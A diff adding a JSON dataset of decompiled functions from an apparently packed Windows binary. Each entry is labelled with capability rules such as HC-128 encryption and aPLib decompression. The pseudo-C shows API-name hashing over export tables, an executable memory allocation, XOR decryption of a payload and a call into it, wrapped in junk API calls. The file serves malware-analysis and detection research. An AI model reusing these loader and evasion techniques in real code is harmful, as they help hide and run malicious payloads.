@@ -1,0 +1,196 @@
+{
+    "00401000": {
+        "rules": [
+            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
+        ],
+        "decompiled_code": "\nuint32_t __cdecl fcn.00401000(uint arg_8h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t arg_ch;\n    uint VirtualAddress;\n    uint NumberOfPages;\n    uint lpDestStr;\n    \n    // [00] -r-x section size 86016 named .text\n    uVar2 = (*_sym.imp.KERNEL32.dll_FoldStringW)(0, 0, 0, 0, 0);\n    arg_ch = uVar2 & 0xff;\n    if (arg_ch != '\\0') {\n        (*_sym.imp.GDI32.dll_GdiPlayDCScript)(arg_ch * arg_ch, arg_ch, arg_ch + 0x642863cd, 0, 0x642863cd, arg_ch);\n        (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        (*_sym.imp.USER32.dll_DefFrameProcA)(0, 0, 0x642863cd, arg_ch, 0);\n        (*_sym.imp.USER32.dll_ScrollDC)(0x7ef83229, arg_ch ^ 0x4f, 0x642863cd, arg_ch, 0x642863cd, arg_ch, uVar2 & 0xcd)\n        ;\n        (*_sym.imp.USER32.dll_GetClassInfoA)(arg_ch, 0x7ef83229, arg_ch);\n    }\n    fcn.00401ec2(0, arg_ch, 0, arg_ch);\n    uVar1 = fcn.004025e2(0, 0);\n    uVar2 = (*_sym.imp.KERNEL32.dll_FoldStringW)((uVar1 | 1) - 1, uVar1, 0, 0, 0);\n    if (uVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_MapUserPhysicalPages)(0x4092, uVar1 ^ uVar2, 1);\n        (*_sym.imp.USER32.dll_ChildWindowFromPointEx)(-uVar2, 0, 0, 0x492e3499);\n        (*_sym.imp.MSVCRT.dll_fputws)(1, 0xa001, 0, uVar1 * 0xb6);\n        (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        (*_sym.imp.GDI32.dll_SelectBrushLocal)(uVar1 & 0x509d00 ^ uVar2, uVar1 - 0xb2);\n    }\n    return uVar2;\n}\n",
+        "token_count": 555
+    },
+    "00401241": {
+        "rules": [
+            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
+        ],
+        "decompiled_code": "\nulong __cdecl fcn.00401241(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint lParam;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint lpEnhMetaRecord;\n    uint cchDest;\n    uint lpSrcStr;\n    uint lpHandletable;\n    uint nHandles;\n    uint dwMapFlags;\n    uint dwInitParam;\n    uint hInstance;\n    uint cchSrc;\n    uint hConsoleOutput;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    *0x423041 = *0x43900c;\n    var_ch = 0x1ee78;\n    var_8h = *0x423041;\n    while (var_ch != 0) {\n        if (var_ch < (arg_ch % 8 & ((arg_ch & 0xffff) % 0x22 ^ 0xe3a8cc8)) + 8) {\n            uVar1 = arg_10h * '\\x02' & arg_10h;\n            *var_8h = **0x423041;\n            var_8h = var_8h + (arg_10h & 0xff) + uVar1 + 1;\n            uVar3 = arg_ch + (arg_ch | 0x7df054c1);\n            *0x423041 = *0x423041 + 1;\n            uVar2 = uVar3 & uVar1;\n            var_ch = var_ch - ((arg_10h & 0xff) * uVar3 + 1);\n            uVar2 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                              (uVar3 + uVar1 * 0x100 + -0x7df054c1, uVar1 * 0x100 - uVar2, uVar2, 0x7df054c1 - uVar3, \n                               uVar3 + 0x820fab3f);\n            if (uVar2 != 0) {\n                (*_sym.imp.USER32.dll_CreateDialogIndirectParamA)\n                          (uVar2 & 0xd0, uVar1 * -0x100, uVar3 & uVar2, uVar3 + 0x34a700, uVar1 * 0x100 + 0x6c04c82b);\n                (*_sym.imp.KERNEL32.dll_SetConsoleActiveScreenBuffer)(uVar3 * 0x32f000 - uVar2);\n                (*_sym.imp.USER32.dll_ShowCaret)(0x9f);\n                (*_sym.imp.MSVCRT.dll__strdate)(uVar2, 0, uVar3, uVar1 * 0x8300 + uVar1 * -0x100);\n            }\n        }\n        else {\n            uVar3 = arg_8h * 0x100;\n            uVar4 = uVar3 * (uVar3 ^ 0x44);\n            *0x423045 = ((*(*0x423041 + arg_10h) * 0x1000000 + *(*0x423041 + arg_8h + uVar4) * 0x10000) - uVar3 * arg_8h\n                        ) + **0x423041 * 0x100 + **0x423041;\n            *0x423049 = uVar4;\n            if ((**0x423041 == *0x423045) && ((*0x423041)[1] == *0x423045)) {\n                *0x423049 = (arg_10h & 0xff) + 1;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                              (0, 0, uVar4, uVar4 * (arg_10h & 0xff), uVar4 & (uVar4 | 0xc32a));\n            if (uVar3 != 0) {\n                (*_sym.imp.MSVCRT.dll_putwc)();\n                (*_sym.imp.GDI32.dll_PlayEnhMetaFileRecord)((uVar3 | 0x1d) + 0xc5d15fb, uVar3, 0, (uVar3 | 0x1d) & 0x46)\n                ;\n                (*_sym.imp.MSVCRT.dll__heapused)(0, 0, 0x1d);\n                (*_sym.imp.USER32.dll_DefMDIChildProcA)(uVar3, 0x1f00, 0x1d, (arg_10h & 0xff) - 0xb0fe);\n            }\n            if (*0x423049 == (uVar4 | 0xc32a) - 0xc32a) {\n                *var_8h = **0x423041;\n                var_8h = var_8h + 1;\n                *0x423041 = *0x423041 + 1;\n                var_ch = var_ch + -1;\n            }\n            else {\n                var_ch = var_ch - (arg_10h * -0xf7 + 8);\n                *0x423041 = *0x423041 + (arg_10h | arg_10h * 0xf8 & 0xff) + 8;\n            }\n        }\n    }\n    *0x423041 = *0x43900c;\n    *0x439014 = var_8h - *0x43900c;\n    return 0xffffffff00000013;\n}\n",
+        "token_count": 1390
+    },
+    "00401c5a": {
+        "rules": [
+            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
+        ],
+        "decompiled_code": "\nuint fcn.00401c5a(void)\n\n{\n    uint32_t uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_FoldStringW)(0, 0, 0, 0, 0);\n    if (uVar1 != 0) {\n        (*_sym.imp.MSVCRT.dll__mbsnicmp)(0xdfaf53b, 0x21000000, 0);\n        (*_sym.imp.KERNEL32.dll_HeapWalk)(0x41f9c28a, uVar1 ^ 0x943c00 | uVar1);\n        (*_sym.imp.USER32.dll_TranslateMessage)(0x3f00cf36);\n    }\n    fcn.004019ce();\n    return 0;\n}\n",
+        "token_count": 196
+    },
+    "00401ec2": {
+        "rules": [
+            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
+        ],
+        "decompiled_code": "\nuint32_t __cdecl fcn.00401ec2(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint dwMapFlags;\n    uint cchData;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    char *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint16_t *var_14h;\n    uint FileHandle;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    uVar2 = arg_10h + 0xd022519d;\n    for (var_14h = (_sym.imp.KERNEL32.dll_GetStartupInfoA + arg_10h + (uVar2 ^ arg_ch & 0xffff) + 0x2fddae63) -\n                   (_sym.imp.KERNEL32.dll_GetStartupInfoA + arg_10h + (arg_ch & 0xffff | uVar2) + 0xae63);\n        *var_14h != (arg_ch & 0xff) + 0x5a4d; var_14h = var_14h - (((arg_14h | arg_8h) - (arg_ch & 0xe8fc)) + 0x10000))\n    {\n    }\n    uVar7 = arg_8h + 0x4147;\n    *0x423039 = var_14h + (*(var_14h + *(var_14h + 0x1e) + 0x78) - (uVar7 + uVar2 + 0x2fdd6d1c));\n    var_8h = *(*0x423039 + (uVar7 + uVar2 + 0x2fdd6d22) * 4) - ((uVar7 | uVar2) + 0x2fddae21);\n    var_28h = var_14h + arg_10h + *(*0x423039 + (uVar7 + uVar2 + 0x2fdd6d24) * 4);\n    uVar3 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                      (uVar7 - 0x4147, (uVar7 | uVar2) + 0x2fddae21, uVar7 * uVar2 + -0x703d7f8b, uVar2 * 2 + 0x5fbb5cc6\n                       , (uVar2 & uVar7) - 0x4105);\n    uVar8 = uVar3;\n    if (uVar3 != 0) {\n        (*_sym.imp.KERNEL32.dll_BindIoCompletionCallback)(uVar7, (uVar7 ^ 0x48179d5b) + uVar2, uVar3);\n        uVar8 = arg_14h & 0xffff;\n        (*_sym.imp.USER32.dll_CallMsgFilterW)(uVar8 | uVar3, uVar8 | 0x75 | uVar3);\n        (*_sym.imp.MSVCRT.dll__wrmdir)(uVar8, uVar8 + 0xa5a03ff3);\n        (*_sym.imp.MSVCRT.dll__wperror)(uVar8 | 0xe8, uVar2);\n    }\n    for (; var_8h != uVar8; var_8h = var_8h - (((arg_14h & 0xfff7) - arg_ch ^ 0xfff7) - 0xfff6)) {\n        *0x42303d = 0;\n        for (var_38h = *var_28h + var_14h; *var_38h != '\\0'; var_38h = var_38h + uVar2 + uVar1 + -0x1006d6d) {\n            iVar6 = arg_ch - (arg_10h | 0x92);\n            uVar1 = iVar6 + arg_ch * iVar6;\n            uVar2 = uVar1 * 0x100;\n            *0x42303d = (*0x42303d << 7 | *0x42303d >> 0x19) +\n                        (var_38h[(uVar2 | arg_14h & 0x1000 & arg_ch) - 0xff6e00] ^ 0x4d);\n        }\n        if (*0x42303d == arg_10h + 0x7d9c6b56U) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_FoldStringW)(0, 0, 0, 0, 0);\n            if (iVar4 != 0) {\n                (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(0);\n                (*_sym.imp.MSVCRT.dll__pclose)();\n                (*_sym.imp.MSVCRT.dll__mktime64)(iVar4, 0xe00, 0, 0xffff1b00);\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(iVar4, 0, iVar4, 0);\n            *0x423039 = *0x423039 + iVar5;\n            var_8h = *(var_14h + (*(*0x423039 + (iVar4 + 6) * 4) - var_8h) * 2 + *(*0x423039 + 0x24));\n            var_28h = var_14h + iVar4 + *(*0x423039 + 0x1c);\n            *0x43900c = (*(var_14h + var_28h[var_8h]))(0, 0x1ee78, 0x1000, 0x40);\n        }\n        var_28h = var_28h + 1;\n    }\n    return uVar8;\n}\n",
+        "token_count": 1468
+    },
+    "00402671": {
+        "rules": [
+            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
+        ],
+        "decompiled_code": "\nuint32_t __cdecl fcn.00402671(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint lpApplicationName;\n    uint dwFlags;\n    uint lpProcessAttributes;\n    uint lpReplacementFileName;\n    uint var_14h;\n    int32_t var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = (arg_8h & 0xff) >> 2;\n    uVar3 = ((uVar2 & 0x4e) + uVar2 | 0x150100) - uVar2;\n    var_4h = (uVar2 & arg_8h & 0xff) + 0x213c3993 ^ 0x217f9a43;\n    var_ch = *((uVar2 & uVar3) + 0x13d09e94 ^ 0x13930e88);\n    uVar2 = uVar2 * uVar2 & 0xff;\n    for (var_10h = 0x1519bd - uVar3; var_10h != 0; var_10h = var_10h + -1) {\n        *var_ch = *(var_4h + ((arg_8h & 0x68) - 0x40));\n        uVar1 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                          (0, (arg_ch | 0x68) - 0x68, (arg_8h ^ 0x68) - 0x7d3b, (arg_8h & 0x68) - 0x40, arg_8h - 0x7d53)\n        ;\n        if (uVar1 != 0) {\n            (*_sym.imp.KERNEL32.dll_ReplaceFileA)\n                      ((arg_8h & 0x1f74) + 0x68, 0x68, arg_8h & 0xef78, (uVar1 ^ 0x89) & arg_8h, 0, arg_8h & 0x1a);\n            (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                      (arg_8h, 0x68, arg_8h, arg_8h, 0x68 - (uVar1 ^ 0xd740000), 0x1a, arg_8h - 0x1a, arg_8h + 0x1a, \n                       uVar1 - 0x53, 0x1a - uVar1);\n            (*_sym.imp.GDI32.dll_GetTextCharsetInfo)(uVar1 & 0x1a, uVar1, uVar1 - 0xa1c7);\n            (*_sym.imp.KERNEL32.dll_GetBinaryTypeW)(0x1a, 0xfb49bdff);\n            (*_sym.imp.GDI32.dll_SetStretchBltMode)(0x68, arg_8h);\n        }\n        var_ch = var_ch + uVar1 * 0x68 + 1;\n        var_4h = var_4h + 1;\n    }\n    *(uVar2 + 0x13d09e08 ^ 0x13930e88) = var_ch;\n    return uVar2;\n}\n",
+        "token_count": 776
+    },
+    "004029cf": {
+        "rules": [
+            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
+        ],
+        "decompiled_code": "\nuint __cdecl fcn.004029cf(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403a0c(0);\n    return 0;\n}\n",
+        "token_count": 60
+    },
+    "00402ed0": {
+        "rules": [
+            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
+        ],
+        "decompiled_code": "\nuchar __cdecl fcn.00402ed0(uint32_t lpSrcStr)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint nYOffset;\n    uint var_10h;\n    uint dwMapFlags;\n    uchar *var_8h;\n    uint lpDestStr;\n    \n    uVar4 = lpSrcStr * 2 & 0xff;\n    uVar1 = (uVar4 & lpSrcStr) * 0x2d;\n    uVar4 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                      ((uVar1 ^ uVar4) - 0x1614, lpSrcStr * uVar1 + -0x11c100, (lpSrcStr | uVar4) - 0xde, \n                       (uVar1 | uVar4) - 0x1694, uVar1 + uVar4 + -0x1714);\n    uVar4 = uVar4 & 0xff;\n    if (uVar4 != '\\0') {\n        (*_sym.imp.KERNEL32.dll_ReadDirectoryChangesW)\n                  (lpSrcStr * uVar4, lpSrcStr * 2, uVar1 - (lpSrcStr & 0x5d9401d4), uVar4 | lpSrcStr, 0, \n                   uVar4 + 0xa006ea9c, lpSrcStr * (uVar4 | uVar1), uVar4 * 0x5a00);\n        (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                  (uVar4 | 0x87906597, uVar1 - (uVar4 | 0x6ba100), uVar1 * uVar4 * 0x44bf, lpSrcStr * (lpSrcStr & uVar4)\n                   , lpSrcStr * 0x77af0000);\n        (*_sym.imp.USER32.dll_SetForegroundWindow)(lpSrcStr);\n    }\n    uVar2 = uVar4 >> 2;\n    var_8h = uVar2 + lpSrcStr + 0x213c38d9 ^ 0x217e09a3;\n    var_18h = *((uVar2 + 0x13d09e98 ^ 0x13930e88) + ((uVar4 >> 5) + uVar2) * 4);\n    var_1ch = uVar2 + 1;\n    uVar1 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                      (-uVar4, (lpSrcStr | uVar1) - 0x16ca, uVar1 - 0x1680, uVar1 * uVar2, uVar1 + uVar4 + -0x1680);\n    if (uVar1 != 0) {\n        (*_sym.imp.GDI32.dll_OffsetRgn)(0, uVar2, 0);\n        (*_sym.imp.MSVCRT.dll__cexit)(uVar2 - 0x7a, uVar1 | 0xff68);\n    }\n    for (; var_1ch != 0; var_1ch = var_1ch - (uVar1 - 0x4e0fcb)) {\n        uVar3 = lpSrcStr - 1;\n        uVar1 = lpSrcStr * 0x62ee;\n        *(var_18h + (uVar3 - 0xc9)) = *var_8h;\n        var_18h = var_18h + ((uVar3 | uVar1) - 0x4e0fcc);\n        var_8h = var_8h + ((uVar3 ^ lpSrcStr | uVar1) - 0x4e0fce);\n    }\n    *0x439010 = var_18h;\n    return 0;\n}\n",
+        "token_count": 900
+    },
+    "0040340f": {
+        "rules": [
+            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
+        ],
+        "decompiled_code": "\nushort fcn.0040340f(void)\n\n{\n    ushort uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004031ba(0, 0x285b);\n    return uVar1;\n}\n",
+        "token_count": 60
+    },
+    "0040358b": {
+        "rules": [
+            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
+        ],
+        "decompiled_code": "\nchar fcn.0040358b(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_FoldStringW)(0, 0, 0, 0, 0);\n    uVar2 = uVar2 & 0xffff;\n    if (uVar2 != 0) {\n        (*_sym.imp.USER32.dll_EnumDisplaySettingsExA)(uVar2, uVar2, 0, uVar2);\n        (*_sym.imp.KERNEL32.dll_OpenSemaphoreW)(uVar2, uVar2, 0);\n        (*_sym.imp.GDI32.dll_SetMapMode)(uVar2, uVar2);\n        (*_sym.imp.GDI32.dll_Escape)(uVar2, uVar2 * 0x4f6c, uVar2 ^ 0xb0567efa, -uVar2, uVar2);\n    }\n    uVar1 = 0;\n    if (uVar2 == 0) {\n        uVar1 = fcn.00401241(uVar2, 0, uVar2);\n    }\n    return (uVar1 | 0x8d) * uVar1;\n}\n",
+        "token_count": 286
+    },
+    "00403906": {
+        "rules": [
+            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
+        ],
+        "decompiled_code": "\nint16_t __cdecl fcn.00403906(uint arg_8h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0x3ca2) {\n        fcn.00402555(0);\n    }\n    return arg_8h;\n}\n",
+        "token_count": 82
+    },
+    "00402555": {
+        "rules": [
+            "hash data using aphash/10489b186fc44711a1078750698db7a9",
+            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
+        ],
+        "decompiled_code": "\nushort __cdecl fcn.00402555(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00402ed0(0xca);\n    return arg_8h;\n}\n",
+        "token_count": 45
+    },
+    "004031ba": {
+        "rules": [
+            "hash data using aphash/10489b186fc44711a1078750698db7a9",
+            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
+        ],
+        "decompiled_code": "\nushort __cdecl fcn.004031ba(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint8_t *var_8h;\n    uint var_4h;\n    \n    var_8h = *0x43900c;\n    uVar2 = (arg_8h ^ 0xc79a) & 0xff;\n    uVar1 = arg_8h;\n    *0x42304d = (uVar1 | uVar2) - 0x1a;\n    for (var_10h = *(arg_8h + 0xe9c4b747 ^ 0xe9872753); var_10h != ((arg_8h & 0xba3b) - arg_ch ^ 0xa2) + 0x28f9;\n        var_10h = var_10h + -1) {\n        *0x42304e = var_8h[uVar1 >> 2 & uVar1] ^ *0x42304d;\n        *var_8h = *0x42304e;\n        *0x42304d = *0x42304d ^ *0x42304e;\n        var_8h = var_8h + 1;\n    }\n    (**((0x1a82dd2d - arg_8h ^ 0x1ac14d21) + ((uVar2 | 0xa2) - 0xba) * 4))();\n    return 0;\n}\n",
+        "token_count": 399
+    },
+    "004034c4": {
+        "rules": [
+            "hash data using aphash/10489b186fc44711a1078750698db7a9",
+            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
+        ],
+        "decompiled_code": "\nuchar __cdecl fcn.004034c4(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = (arg_8h | 0x4ef1) & 0xff;\n    if ((uVar1 % (uVar1 >> 3 & uVar1)) % (arg_8h | 0xd42e) == 1) {\n        fcn.00401d61(arg_8h);\n    }\n    return 0;\n}\n",
+        "token_count": 136
+    },
+    "00403762": {
+        "rules": [
+            "hash data using aphash/10489b186fc44711a1078750698db7a9",
+            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
+        ],
+        "decompiled_code": "\nushort __cdecl fcn.00403762(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint lpFileName;\n    uint dwMapFlags;\n    \n    uVar5 = arg_8h >> 3 & 0xffff;\n    uVar2 = arg_8h * arg_8h * ((arg_8h & 0xff) << 8);\n    uVar1 = uVar5 | 0x3c00;\n    uVar6 = uVar2 + (arg_8h | 0x97) & 0xffff;\n    uVar3 = uVar5 ^ 0x3eb2;\n    if (uVar1 == 0x3ca2) {\n        uVar1 = fcn.00403906(0x3ca2);\n        uVar1 = uVar1 & 0xffff;\n    }\n    uVar4 = uVar3 % (uVar2 + uVar5 * -0x515d7f7a);\n    uVar5 = uVar1 - (uVar3 & arg_8h);\n    uVar2 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                      ((uVar3 | uVar1) - 0x3eb2, uVar4 * uVar6 + -0x243eb70, uVar3 + uVar4 + -0x5c20, \n                       (uVar6 ^ uVar1) - 0x3035, (uVar6 - uVar3) + 0x2179);\n    if (uVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_Module32NextW)(uVar4, uVar2 & 0x427b);\n        (*_sym.imp.KERNEL32.dll_GetPrivateProfileSectionNamesW)(0, uVar3 | 0x3767 | uVar6, uVar4 - (uVar5 | 0x6aa2));\n    }\n    if (uVar6 == 0xc97) {\n        fcn.00403984((uVar6 ^ uVar3 % uVar5) - arg_8h & 0xffff, uVar4);\n    }\n    return 0x8900;\n}\n",
+        "token_count": 524
+    },
+    "00401d61": {
+        "rules": [
+            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
+            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
+        ],
+        "decompiled_code": "\nulong __cdecl fcn.00401d61(uint32_t arg_8h)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint32_t arg_8h_00;\n    uint16_t uVar3;\n    uint lpSrcStr;\n    \n    uVar2 = arg_8h * (0x79e59 - arg_8h & 0x97) * -0x46630000 | 0x70e44ee9;\n    if (uVar2 == 0x70e44ee9) {\n        fcn.00402a84(0x70e44ee9, 0);\n    }\n    arg_8h_00 = 0x1cfcd400 - uVar2;\n    iVar1 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                      (((arg_8h_00 * 2 & 0xe8) >> 1) - 0x14, -0x53e77ae9 - arg_8h_00, 0, \n                       arg_8h_00 * 0x4ee9 + -0x1ade23ef, arg_8h_00 * 0x4ee9 + -0x1ade23ef);\n    if (iVar1 != 0) {\n        (*_sym.imp.GDI32.dll_GetObjectType)(uVar2 * -2 + 0x1cfc4a00);\n        (*_sym.imp.KERNEL32.dll_GetConsoleScreenBufferInfo)(arg_8h_00 | 0x30070000, arg_8h_00 * uVar2);\n    }\n    if (iVar1 + 1U == 1) {\n        fcn.00403762(arg_8h_00);\n    }\n    uVar3 = iVar1 + 1U | 0x4e00;\n    return CONCAT44(uVar3 | arg_8h, uVar3 >> 1);\n}\n",
+        "token_count": 424
+    },
+    "004025e2": {
+        "rules": [
+            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
+            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
+        ],
+        "decompiled_code": "\nuint32_t fcn.004025e2(uint32_t param_1, uint32_t param_2)\n\n{\n    uint32_t unaff_ESI;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = (param_1 ^ param_2 & 0xffff) & 0xff;\n    if (uVar1 == '\\0') {\n        uVar1 = fcn.00402d55(uVar1, uVar1, (param_2 & 0xffff) - 1 & 0xffff);\n        uVar1 = uVar1 & 0xff;\n    }\n    uVar2 = uVar1 | unaff_ESI & 0xff;\n    if (unaff_ESI == 0) {\n        uVar2 = fcn.004034c4(uVar1 >> 1);\n        uVar2 = uVar2 & 0xff;\n    }\n    return uVar2 * (uVar1 >> 1) + unaff_ESI & 0xff;\n}\n",
+        "token_count": 227
+    },
+    "00402933": {
+        "rules": [
+            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
+            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
+        ],
+        "decompiled_code": "\nuint __cdecl fcn.00402933(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        fcn.004029cf(0x3437, 0x18d7, 0x3437);\n    }\n    return 1;\n}\n",
+        "token_count": 73
+    },
+    "00402d55": {
+        "rules": [
+            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
+            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
+        ],
+        "decompiled_code": "\nint32_t __cdecl fcn.00402d55(uint noname_0, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uchar *var_4h;\n    \n    uVar1 = (arg_10h ^ 0xcb24) & 0xff;\n    var_4h = (uVar1 & arg_10h * 0x51f4 & 0xff) + 0x213c399b ^ 0x217c71f0;\n    var_ch = *(((uVar1 | 0x6c) - 0xff) * 4 + 0x43900c);\n    for (var_10h = (uVar1 >> 1) * 0x6c + 0xe1f9; var_10h != (uVar1 >> 1) * 0x6c + -0x2dfc;\n        var_10h = var_10h - ((arg_10h ^ 0x6e40 % arg_10h) - 0xffbe)) {\n        *var_ch = *var_4h;\n        var_ch = var_ch + (0x10000 - arg_10h);\n        var_4h = var_4h + ((arg_10h & 0x6e40) - 0x6e3f);\n    }\n    *0x439010 = var_ch;\n    return arg_ch * arg_ch;\n}\n",
+        "token_count": 382
+    },
+    "00403357": {
+        "rules": [
+            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
+            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
+        ],
+        "decompiled_code": "\nuchar __cdecl fcn.00403357(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uchar uVar1;\n    uint var_4h;\n    \n    fcn.00402671((arg_8h + 0x1f67a2U) % arg_ch, 0);\n    uVar1 = fcn.00402933(0);\n    return uVar1;\n}\n",
+        "token_count": 90
+    },
+    "00401bba": {
+        "rules": [
+            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
+        ],
+        "decompiled_code": "\nuint fcn.00401bba(void)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040358b();\n    fcn.00401c5a();\n    return 0;\n}\n",
+        "token_count": 64
+    },
+    "00403a0c": {
+        "rules": [
+            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
+        ],
+        "decompiled_code": "\nulong __cdecl fcn.00403a0c(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_8h;\n    uint lpRGBTriples;\n    \n    uVar3 = (arg_8h & 0xff) * 0x100;\n    uVar1 = (arg_8h & 0xffff) + (arg_8h & 0xff) * -0x100;\n    arg_8h = arg_8h & 0xffff;\n    uVar2 = uVar1 * 0x100;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                      (arg_8h - uVar1, uVar3 ^ uVar1, arg_8h ^ uVar1, uVar3 + uVar1, uVar1 | uVar3);\n    uVar3 = uVar3 & 0xffff;\n    if (uVar3 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(uVar3);\n        (*_sym.imp.USER32.dll_SetSystemCursor)(uVar1, uVar1);\n        (*_sym.imp.MSVCRT.dll__aligned_free)(uVar2, arg_8h, uVar3 & arg_8h);\n        (*_sym.imp.GDI32.dll_CheckColorsInGamut)\n                  ((uVar3 & arg_8h) + uVar1, (uVar1 | 0x6d) * uVar2, uVar1 + (uVar2 | uVar3), arg_8h ^ 0xc129);\n        (*_sym.imp.GDI32.dll_SetMapMode)(uVar2, uVar3);\n    }\n    uVar3 = fcn.00401bba();\n    return CONCAT44((uVar3 & 0xffff) + 1, uVar1);\n}\n",
+        "token_count": 428
+    },
+    "00402a84": {
+        "rules": [
